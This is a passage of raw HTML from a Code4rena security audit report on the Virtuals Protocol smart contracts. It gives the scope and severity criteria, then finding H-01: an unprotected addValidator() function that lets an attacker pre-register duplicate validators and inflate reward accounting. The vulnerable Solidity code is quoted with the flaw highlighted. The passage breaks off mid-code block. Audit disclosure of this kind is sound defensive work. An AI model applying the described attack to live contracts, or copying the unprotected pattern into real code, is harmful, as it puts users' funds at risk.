9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol\"\u003eC4 Virtuals Protocol repository\u003c/a\u003e, and is composed of 43 smart contracts written in the Solidity programming language and includes 5,238 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"high-risk-findings-6\" style=\"position:relative;\"\u003e\u003ca href=\"#high-risk-findings-6\" aria-label=\"high risk findings 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eHigh Risk Findings (6)\u003c/h1\u003e\n\u003ch2 id=\"h-01-lack-of-access-control-in-agentnftv2addvalidator-enables-unauthorized-validator-injection-and-causes-reward-accounting-inconsistencies\" style=\"position:relative;\"\u003e\u003ca href=\"#h-01-lack-of-access-control-in-agentnftv2addvalidator-enables-unauthorized-validator-injection-and-causes-reward-accounting-inconsistencies\" aria-label=\"h 01 lack of access control in agentnftv2addvalidator enables unauthorized validator injection and causes reward accounting inconsistencies permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-3\"\u003e[H-01] Lack of access control in \u003ccode\u003eAgentNftV2::addValidator()\u003c/code\u003e enables unauthorized validator injection and causes reward accounting inconsistencies\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-292\"\u003ejoicygiore\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-510\"\u003eAstroboy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-803\"\u003eBRONZEDISC\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-287\"\u003eclassic-k\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-703\"\u003eCoheeYang\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-621\"\u003eDamboy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-748\"\u003eDanielTan_MetaTrust\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-134\"\u003edanzero\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-190\"\u003edebo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-5\"\u003egmh5225\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-392\"\u003egregom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-649\"\u003ehail_the_lord\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-640\"\u003ehecker_trieu_tien\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-80\"\u003ehirosyama\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-397\"\u003eholtzzx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-323\"\u003eio10\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-443\"\u003elevi_104\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-820\"\u003eOlugbenga\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-515\"\u003ePotEater\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-647\"\u003eshui\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-459\"\u003etestnate\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentNftV2.sol#L133-L139\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentNftV2.sol#L133-L139\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eAgentNftV2::addValidator()\u003c/code\u003e function lacks any form of access control. While the \u003ccode\u003emint()\u003c/code\u003e function of \u003ccode\u003eAgentNftV2\u003c/code\u003e does enforce role-based restrictions (\u003ccode\u003eMINTER_ROLE\u003c/code\u003e), a malicious actor can exploit the \u003ccode\u003eAgentFactoryV2::executeApplication()\u003c/code\u003e logic to predict and obtain the next \u003ccode\u003evirtualId\u003c/code\u003e through a call to \u003ccode\u003eIAgentNft(nft).nextVirtualId()\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eBy doing so, an attacker can preemptively call \u003ccode\u003eaddValidator()\u003c/code\u003e and append a validator to \u003ccode\u003e_validators[virtualId]\u003c/code\u003e. Later, when \u003ccode\u003eAgentNftV2::mint()\u003c/code\u003e is called, it invokes \u003ccode\u003e_addValidator()\u003c/code\u003e again, causing the validator to be added a second time. This results in a duplicate validator entry for the same virtual ID.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentNftV2::mint()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function mint(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address to,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        string memory newTokenURI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address payable theDAO,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address founder,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8[] memory coreTypes,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address pool,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address token\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) external onlyRole(MINTER_ROLE) returns (uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(virtualId == _nextVirtualId, \u0026quot;Invalid virtualId\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _nextVirtualId++;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _mint(to, virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _setTokenURI(virtualId, newTokenURI);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        VirtualInfo storage info = virtualInfos[virtualId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        info.dao = theDAO;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        info.coreTypes = coreTypes;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        info.founder = founder;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IERC5805 daoToken = GovernorVotes(theDAO).token();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        info.token = token;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVirtualLP storage lp = virtualLPs[virtualId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp.pool = pool;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp.veToken = address(daoToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e_stakingTokenToVirtualId[address(daoToken)] = virtualId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        _addValidator(virtualId, founder);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        _initValidatorScore(virtualId, founder);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return virtualId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentNftV2::addValidator()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Expected to be called by `AgentVeToken::stake()` function\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function addValidator(uint256 virtualId, address validator) public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (isValidator(virtualId, validator)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _addValidator(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _initValidatorScore(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // ValidatorRegistry::_addValidator()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _addValidator(uint256 virtualId, address validator) internal {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _validatorsMap[virtualId][validator] = true;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        _validators[virtualId].push(validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        emit NewValidator(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// AgentFactoryV2::executeApplication() \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecuteApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This will bootstrap an Agent with following components:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C1: Agent Token\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C2: LP Pool + Initial liquidity\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C3: Agent veToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C4: Agent DAO\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C5: Agent NFT\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C6: TBA\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C7: Stake liquidity token to get veToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// SNIP...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C5\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enextVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_vault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenURI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// SNIP...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe reward mechanism in \u003ccode\u003eAgentRewardV2\u003c/code\u003e relies on iterating over validator lists to compute and distribute rewards. If a validator is duplicated due to the aforementioned issue, the reward distribution logic - particularly in \u003ccode\u003e_distributeValidatorRewards()\u003c/code\u003e — recalculates and overwrites the validator’s rewards.\u003c/p\u003e\n\u003cp\u003eThis does not break reward allocation for individual validators due to overwriting. However, the shared variable \u003ccode\u003evalidatorPoolRewards\u003c/code\u003e accumulates validator-level residuals multiple times due to the duplicated validator entries. As a result, \u003ccode\u003evalidatorPoolRewards\u003c/code\u003e can become overstated relative to the actual token amount deposited.\u003c/p\u003e\n\u003cp\u003eWhen \u003ccode\u003ewithdrawValidatorPoolRewards()\u003c/code\u003e is eventually called, it transfers this erroneously accumulated excess amount to the designated address. This reduces the contract’s balance below what is required to cover valid validator rewards, ultimately resulting in reward claim failures unless someone manually tops up the shortfall.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentRewardV2::distributeRewards()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function distributeRewards(uint256 amount) public onlyGov returns (uint32) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(amount \u0026gt; 0, \u0026quot;Invalid amount\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        IERC20(rewardToken).safeTransferFrom(_msgSender(), address(this), amount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        RewardSettingsCheckpoints.RewardSettings memory settings = getRewardSettings();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 protocolShares = _distributeProtocolRewards(amount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan 